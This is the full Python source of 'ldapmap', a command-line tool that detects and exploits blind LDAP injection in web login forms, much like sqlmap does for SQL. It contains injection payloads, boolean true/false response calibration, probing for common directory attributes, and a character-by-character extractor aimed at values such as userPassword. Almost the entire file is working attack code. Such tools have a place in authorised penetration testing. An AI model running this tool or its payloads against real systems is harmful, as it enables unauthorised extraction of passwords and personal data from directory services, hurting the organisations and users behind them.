#!/usr/bin/env python3
"""
ldapmap.py — Blind LDAP Injection Scanner and Extractor
========================================================
A command-line tool that automatically detects and exploits LDAP Injection
vulnerabilities using blind boolean-based techniques, similar in concept to
sqlmap for SQL injection.

Usage examples:
    # Detect injection in a POST form parameter
    python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" -p pass

    # Extract the value of the 'userPassword' attribute
    python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" \
        -p pass --extract userPassword

    # Inject into a JSON body parameter
    python ldapmap.py -u http://target/login \
        --jsondata '{"username":"admin","password":"INJECT_HERE"}' \
        -p password --extract userPassword

    # Route traffic through Burp Suite for debugging
    python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" \
        -p pass --proxy http://127.0.0.1:8080

    # Enable verbose mode to log every outgoing payload
    python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" \
        -p pass --verbose
"""

import argparse
import json
import sys
import string
from urllib.parse import quote, urlencode, parse_qs

import requests


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Characters tested during blind extraction (ordered to try common chars first)
CHARSET = (
    string.ascii_lowercase
    + string.ascii_uppercase
    + string.digits
    + "!@#$%^&*-_+=<>?/.,;:'\"`~|\\{}"
)

# LDAP attributes checked when --extract is not specified
COMMON_ATTRIBUTES = [
    "uid",
    "cn",
    "sn",
    "mail",
    "givenName",
    "displayName",
    "userPassword",
    "description",
    "telephoneNumber",
    "memberOf",
    "objectClass",
]

# Payloads used to detect raw injection errors
DETECTION_PAYLOADS = [
    "*",
    "(",
    ")",
    "\\",
    "\x00",
    "*)(objectClass=*))(&(objectClass=",
    "*))(|(objectClass=*",
    "*()|%26",
]

# Payloads used to distinguish AND-wrapped vs OR-wrapped queries
LOGIC_PAYLOADS = {
    "AND_true": "*)(objectClass=*))(&(objectClass=",
    "OR_true": "*))(|(objectClass=*",
}

# Tolerance (in bytes) for response-length comparison
LENGTH_TOLERANCE = 20

# Request timeout in seconds
TIMEOUT = 10


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------


def build_session(proxy: str | None) -> requests.Session:
    """Create and return a requests.Session optionally configured with a proxy."""
    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
        # Disable SSL verification when using a proxy (e.g. Burp Suite)
        session.verify = False
    return session


def send_request(
    session: requests.Session,
    url: str,
    data: dict,
    verbose: bool = False,
    use_json: bool = False,
) -> requests.Response | None:
    """
    Send a POST request and return the response.

    When *verbose* is True, each outgoing payload is printed to stdout before
    the request is dispatched.

    When *use_json* is True the payload is sent as a JSON body
    (``Content-Type: application/json``); otherwise it is sent as
    URL-encoded form data.

    Returns None on connection errors so callers can handle failures gracefully.
    """
    if verbose:
        if use_json:
            print(f"[V] POST {url}  json={json.dumps(data)}")
        else:
            print(f"[V] POST {url}  data={urlencode(data)}")
    try:
        post_kwargs = {"json": data} if use_json else {"data": data}
        resp = session.post(url, **post_kwargs, timeout=TIMEOUT)
        if verbose:
            print(f"[V] HTTP {resp.status_code}")
        return resp
    except requests.exceptions.ConnectionError as exc:
        print(f"[!] Connection error: {exc}", file=sys.stderr)
        return None
    except requests.exceptions.Timeout:
        print("[!] Request timed out.", file=sys.stderr)
        return None
    except requests.exceptions.RequestException as exc:
        print(f"[!] Unexpected request error: {exc}", file=sys.stderr)
        return None


# ---------------------------------------------------------------------------
# Payload construction
# ---------------------------------------------------------------------------


def build_payload_data(
    base_data: dict,
    param: str,
    injection: str,
    use_json: bool = False,
) -> dict:
    """
    Return a copy of *base_data* with *param* replaced by *injection*.

    For form data (``use_json=False``) the injection string is URL-encoded
    before substitution so that special LDAP characters travel correctly over
    HTTP.  For JSON data (``use_json=True``) the raw string is used because
    the requests library serialises the dict to JSON automatically.
    """
    payload_data = dict(base_data)
    if use_json:
        payload_data[param] = injection
    else:
        # quote() encodes characters that would break the form field; the server
        # decodes them back before passing the value to the LDAP query.
        payload_data[param] = quote(injection, safe="")
    return payload_data


# ---------------------------------------------------------------------------
# Baseline & true/false calibration
# ---------------------------------------------------------------------------


def get_baseline(
    session: requests.Session,
    url: str,
    base_data: dict,
    verbose: bool = False,
    use_json: bool = False,
) -> tuple[int, int]:
    """
    Send an unmodified request and return *(status_code, content_length)*.

    This baseline is used to detect deviations caused by injected payloads.
    """
    resp = send_request(session, url, base_data, verbose, use_json)
    if resp is None:
        print("[!] Could not reach target for baseline request. Aborting.", file=sys.stderr)
        sys.exit(1)
    length = len(resp.content)
    print(f"[*] Baseline — HTTP {resp.status_code}, length={length}")
    return resp.status_code, length


def is_true_response(
    resp: requests.Response | None,
    true_status: int | set[int] | list[int] | tuple[int, ...],
    true_length: int,
    false_statuses: set[int] | list[int] | tuple[int, ...] | int | None = None,
) -> bool:
    """
    Return True when *resp* looks like a successful ("true") LDAP result.

    A response is considered "true" when:
      - the HTTP status code is in the TRUE status set, AND
      - the content length is within LENGTH_TOLERANCE bytes of the baseline.
    """
    if resp is None:
        return False
    if isinstance(true_status, int):
        true_statuses = {true_status}
    else:
        true_statuses = set(true_status)
    if false_statuses is None:
        false_status_set: set[int] = set()
    elif isinstance(false_statuses, int):
        false_status_set = {false_statuses}
    else:
        false_status_set = set(false_statuses)
    status = resp.status_code
    if status in true_statuses:
        length_match = abs(len(resp.content) - true_length) <= LENGTH_TOLERANCE
        return length_match
    if status in false_status_set:
        return False
    return False


def classify_response(
    resp: requests.Response | None,
    true_status: int | set[int] | list[int] | tuple[int, ...],
    true_length: int,
    false_statuses: set[int] | list[int] | tuple[int, ...] | int | None = None,
) -> str:
    """
    Classify a response as "true", "false", or "error".

    Status codes in *true_status* are evaluated with content-length matching.
    Status codes in *false_statuses* are classified as "false".
    Any other status code is classified as "error".
    """
    if resp is None:
        return "error"
    if isinstance(true_status, int):
        true_statuses = {true_status}
    else:
        true_statuses = set(true_status)
    if false_statuses is None:
        false_status_set: set[int] = set()
    elif isinstance(false_statuses, int):
        false_status_set = {false_statuses}
    else:
        false_status_set = set(false_statuses)

    if resp.status_code in true_statuses:
        return "true" if is_true_response(resp, true_statuses, true_length) else "false"
    if resp.status_code in false_status_set:
        return "false"
    return "error"


def calibrate(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
) -> tuple[int, int]:
    """
    Attempt to identify a "true" response signature by injecting a wildcard.

    Sends *(param)=** which should match any LDAP entry and return a "true"
    response.  If that wildcard response differs from the baseline we swap the
    reference values so that subsequent checks compare against the correct
    "true" fingerprint.

    Returns the (status, length) pair that represents a TRUE response.
    """
    wildcard_data = build_payload_data(base_data, param, "*", use_json)
    resp = send_request(session, url, wildcard_data, verbose, use_json)
    if resp is None:
        return true_status, true_length

    wc_length = len(resp.content)
    wc_status = resp.status_code

    if wc_status != true_status or abs(wc_length - true_length) > LENGTH_TOLERANCE:
        # The wildcard produced a different response — use it as the TRUE marker
        print(
            f"[*] Calibration: wildcard response differs from baseline. "
            f"Using wildcard signature as TRUE (HTTP {wc_status}, length={wc_length})."
        )
        return wc_status, wc_length

    print(f"[*] Calibration: wildcard matches baseline (HTTP {wc_status}, length={wc_length}).")
    return true_status, true_length


# ---------------------------------------------------------------------------
# Detection module
# ---------------------------------------------------------------------------


def detect_injection(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
    probe_attr: str = "objectClass",
    true_statuses: set[int] | None = None,
    false_statuses: set[int] | None = None,
) -> bool:
    """
    Probe the target with common LDAP meta-characters and logic payloads.

    Prints a report of which payloads caused a different response, which
    indicates that the parameter is embedded in an LDAP query without sanitization.

    *probe_attr* is the LDAP attribute used in the AND/OR logic probes (e.g.
    ``)(attr=*))(&(attr=``).  It defaults to ``objectClass`` which is present
    on every LDAP entry, but you can supply any attribute that is known to
    exist on the target entry so that the probes do not rely on ``objectClass``
    being present.

    Returns True if at least one payload produced a distinguishable response.
    """
    print("\n[*] --- Detection Phase ---")
    vulnerable = False

    # Build probes dynamically so the caller controls which attribute is used
    detection_payloads = [
        p.replace("objectClass", probe_attr) for p in DETECTION_PAYLOADS
    ]
    logic_payloads = {
        k: v.replace("objectClass", probe_attr) for k, v in LOGIC_PAYLOADS.items()
    }

    for payload in detection_payloads:
        data = build_payload_data(base_data, param, payload, use_json)
        resp = send_request(session, url, data, verbose, use_json)
        if resp is None:
            continue
        length = len(resp.content)
        status_true_set = true_statuses if true_statuses is not None else {true_status}
        classification = classify_response(resp, status_true_set, true_length, false_statuses)
        different = classification != "true"
        marker = "[!] DIFFERENT" if different else "    same     "
        print(
            f"  {marker}  payload={repr(payload):<40} "
            f"HTTP {resp.status_code}, length={length}, class={classification.upper()}"
        )
        if different:
            vulnerable = True

    # AND / OR logic probes
    print("\n[*] AND/OR logic probes:")
    for label, payload in logic_payloads.items():
        data = build_payload_data(base_data, param, payload, use_json)
        resp = send_request(session, url, data, verbose, use_json)
        if resp is None:
            continue
        status_true_set = true_statuses if true_statuses is not None else {true_status}
        classification = classify_response(resp, status_true_set, true_length, false_statuses)
        looks_true = classification == "true"
        print(
            f"  [{label}] payload={repr(payload):<50} "
            f"→ {classification.upper()}"
        )
        if looks_true:
            vulnerable = True

    return vulnerable


# ---------------------------------------------------------------------------
# Attribute discovery module
# ---------------------------------------------------------------------------


def discover_attributes(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
    attributes: list[str] | None = None,
    true_statuses: set[int] | None = None,
    false_statuses: set[int] | None = None,
) -> list[str]:
    """
    Iterate through *attributes* and test each with a wildcard payload.

    The payload format is: )(attribute=*)
    A "true" response implies that attribute exists on the LDAP entry.

    When *attributes* is ``None`` the built-in ``COMMON_ATTRIBUTES`` list is
    used.  Pass a custom list (e.g. built from ``--attributes``) to extend or
    replace that default set.

    Returns the list of attributes that appear to exist.
    """
    if attributes is None:
        attributes = COMMON_ATTRIBUTES
    print("\n[*] --- Attribute Discovery Phase ---")
    found: list[str] = []

    for attr in attributes:
        payload = f")({attr}=*)"
        data = build_payload_data(base_data, param, payload, use_json)
        resp = send_request(session, url, data, verbose, use_json)
        if resp is None:
            continue
        status_true_set = true_statuses if true_statuses is not None else {true_status}
        classification = classify_response(resp, status_true_set, true_length, false_statuses)
        if classification == "true":
            print(f"  [+] Attribute present: {attr}")
            found.append(attr)
        elif classification == "false":
            print(f"  [-] Attribute absent:  {attr}")
        else:
            print(
                f"  [!] Attribute {attr}: unexpected HTTP {resp.status_code} (classified as ERROR)",
                file=sys.stderr,
            )

    return found


# ---------------------------------------------------------------------------
# Data extraction module (blind char-by-char)
# ---------------------------------------------------------------------------


def extract_attribute(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    attribute: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
    true_statuses: set[int] | None = None,
    false_statuses: set[int] | None = None,
) -> str:
    """
    Extract the value of *attribute* one character at a time using LDAP wildcards.

    For each position the function tries every character in CHARSET by sending
    a payload of the form:
        )(attribute=<known_prefix><candidate>*)

    When the response looks "true" the candidate character is appended to the
    known prefix and the search moves to the next position.

    The discovered value is printed incrementally to stdout.

    Returns the fully extracted value string.
    """
    print(f"\n[*] --- Extraction Phase: {attribute} ---")
    extracted = ""
    print(f"  [*] Extracting {attribute}: ", end="", flush=True)

    while True:
        found_char = False
        for char in CHARSET:
            # Build blind payload: )(attr=<prefix><char>*)
            payload = f")({attribute}={extracted}{char}*)"
            data = build_payload_data(base_data, param, payload, use_json)
            resp = send_request(session, url, data, verbose, use_json)
            if resp is None:
                continue
            status_true_set = true_statuses if true_statuses is not None else {true_status}
            classification = classify_response(resp, status_true_set, true_length, false_statuses)
            if classification == "true":
                extracted += char
                print(char, end="", flush=True)
                found_char = True
                break  # Move to next position
            if classification == "error":
                print(
                    f"\n  [!] Unexpected HTTP {resp.status_code} while testing {attribute} "
                    f"prefix '{extracted}{char}' (classified as ERROR)",
                    file=sys.stderr,
                )

        if not found_char:
            # No character matched — value is fully extracted
            break

    print()  # Newline after the extracted value
    return extracted


# ---------------------------------------------------------------------------
# CLI argument parsing
# ---------------------------------------------------------------------------


def parse_args() -> argparse.Namespace:
    """Define and parse command-line arguments."""
    parser = argparse.ArgumentParser(
        prog="ldapmap",
        description=(
            "Blind LDAP Injection Scanner and Extractor.\n"
            "Detect and exploit LDAP injection vulnerabilities automatically."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "-u", "--url",
        required=True,
        metavar="URL",
        help="Target URL (e.g., http://target/login)",
    )
    data_group = parser.add_mutually_exclusive_group(required=True)
    data_group.add_argument(
        "-d", "--data",
        metavar="DATA",
        help='POST form data, e.g. "username=admin&password=INJECT_HERE"',
    )
    data_group.add_argument(
        "--jsondata",
        metavar="JSON",
        help=(
            'POST JSON body, e.g. \'{"username":"admin","password":"INJECT_HERE"}\'. '
            "Sends Content-Type: application/json. "
            "Use --param to specify which top-level key to inject into."
        ),
    )
    parser.add_argument(
        "-p", "--param",
        required=True,
        metavar="PARAM",
        help="Name of the parameter to inject into (e.g., password)",
    )
    parser.add_argument(
        "--proxy",
        metavar="PROXY",
        default=None,
        help="Optional HTTP proxy URL (e.g., http://127.0.0.1:8080)",
    )
    parser.add_argument(
        "--extract",
        metavar="ATTRIBUTE",
        default=None,
        help=(
            "LDAP attribute whose value should be extracted "
            "(e.g., userPassword). If omitted, attribute discovery is run."
        ),
    )
    parser.add_argument(
        "--attributes",
        metavar="ATTR",
        action="append",
        default=None,
        dest="attributes",
        help=(
            "Additional LDAP attribute to include in discovery "
            "(can be repeated, e.g. --attributes uid --attributes cn). "
            "The first supplied attribute is also used as the probe attribute "
            "in injection detection instead of the default 'objectClass', so "
            "the tool does not need objectClass to be present on the entry."
        ),
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        default=False,
        help="Print every outgoing POST payload to stdout.",
    )
    parser.add_argument(
        "--true-status",
        metavar="CODE",
        action="append",
        type=int,
        default=None,
        dest="true_statuses",
        help=(
            "HTTP status code to classify as TRUE (repeatable). "
            "If omitted, the calibrated baseline TRUE status is used."
        ),
    )
    parser.add_argument(
        "--false-status",
        metavar="CODE",
        action="append",
        type=int,
        default=None,
        dest="false_statuses",
        help=(
            "HTTP status code to classify as FALSE (repeatable). "
            "Codes outside TRUE/FALSE sets are classified as ERROR."
        ),
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


def main() -> None:
    """Main orchestration function."""
    args = parse_args()

    if args.jsondata is not None:
        # Parse JSON body into a dict
        try:
            base_data = json.loads(args.jsondata)
        except json.JSONDecodeError as exc:
            print(f"[!] Invalid JSON in --jsondata: {exc}", file=sys.stderr)
            sys.exit(1)
        if not isinstance(base_data, dict):
            print("[!] --jsondata must be a JSON object (key/value pairs).", file=sys.stderr)
            sys.exit(1)
        use_json = True
    else:
        # Parse form data string into a dict (parse_qs returns lists; flatten them)
        parsed = parse_qs(args.data, keep_blank_values=True)
        base_data = {k: v[0] for k, v in parsed.items()}
        use_json = False

    if args.param not in base_data:
        data_flag = "--jsondata" if use_json else "--data"
        print(
            f"[!] Parameter '{args.param}' not found in {data_flag}. "
            "Check spelling and try again.",
            file=sys.stderr,
        )
        sys.exit(1)

    print(f"[*] Target  : {args.url}")
    print(f"[*] Param   : {args.param}")
    print(f"[*] Mode    : {'JSON body' if use_json else 'form data'}")
    if args.proxy:
        print(f"[*] Proxy   : {args.proxy}")
    if args.verbose:
        print("[*] Verbose : enabled")

    # Build the attribute list and choose a probe attribute for detection.
    # Extra attributes are prepended so they appear first in discovery output
    # and the first one is used as the probe attribute in logic probes (so the
    # tool does not rely on objectClass being present when the caller knows
    # which attributes actually exist on the target entries).
    extra_attrs: list[str] = args.attributes or []
    if extra_attrs:
        # Deduplicate while preserving order (extra attrs first)
        all_attrs = list(dict.fromkeys(extra_attrs + COMMON_ATTRIBUTES))
        probe_attr = extra_attrs[0]
        print(f"[*] Extra attributes: {', '.join(extra_attrs)}")
        print(f"[*] Probe attribute : {probe_attr}")
    else:
        all_attrs = COMMON_ATTRIBUTES
        probe_attr = "objectClass"

    session = build_session(args.proxy)

    # 1. Baseline
    true_status, true_length = get_baseline(session, args.url, base_data, args.verbose, use_json)

    # 2. Calibrate TRUE fingerprint
    true_status, true_length = calibrate(
        session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json
    )
    true_statuses = set(args.true_statuses) if args.true_statuses else {true_status}
    false_statuses = set(args.false_statuses) if args.false_statuses else set()
    overlap = true_statuses & false_statuses
    if overlap:
        false_statuses -= overlap
        print(
            f"[!] Ignoring overlapping FALSE statuses that are also TRUE: {sorted(overlap)}",
            file=sys.stderr,
        )

    # 3. Detection
    vulnerable = detect_injection(
        session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json,
        probe_attr,
        true_statuses=true_statuses,
        false_statuses=false_statuses,
    )

    if not vulnerable:
        print(
            "\n[*] No distinguishable differences detected. "
            "The parameter may not be injectable, or the responses are indistinguishable."
        )
    else:
        print("\n[+] Parameter appears to be injectable!")

    # 4. Attribute discovery or extraction
    if args.extract:
        value = extract_attribute(
            session, args.url, base_data, args.param,
            args.extract, true_status, true_length, args.verbose, use_json,
            true_statuses=true_statuses, false_statuses=false_statuses,
        )
        if value:
            print(f"\n[+] Extracted {args.extract} = {value}")
        else:
            print(f"\n[-] Could not extract value for attribute '{args.extract}'.")
    else:
        attrs = discover_attributes(
            session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json,
            all_attrs,
            true_statuses=true_statuses, false_statuses=false_statuses,
        )
        if attrs:
            print(f"\n[+] Discovered attributes: {', '.join(attrs)}")
            print("[*] Re-run with --extract <attribute> to retrieve the full value.")
        else:
            print("\n[-] No common attributes discovered.")


if __name__ == "__main__":
    main()
